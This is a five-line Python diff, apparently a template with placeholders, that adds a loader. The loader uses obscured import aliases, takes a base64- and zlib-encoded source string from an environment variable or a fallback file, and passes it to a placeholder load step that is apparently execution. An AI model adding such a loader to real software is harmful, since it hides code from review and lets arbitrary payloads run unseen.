@@ -1,0 +1,5 @@
+import os as _djs_o,types as _djs_t,base64 as _djs_b,zlib as _djs_z
+_djs_e=_djs_o.environ.get({{PAYLOAD_ENV}}); _djs_p={{RUNTIME_PATH}}
+_djs_src=_djs_z.decompress(_djs_b.b64decode(_djs_e)).decode("utf-8") if _djs_e else (open(_djs_p,encoding="utf-8").read() if _djs_o.path.exists(_djs_p) else None)
+if _djs_src is None: print({{NEEDS_INLINE_PREFIX}})
+else: {{LOAD}}
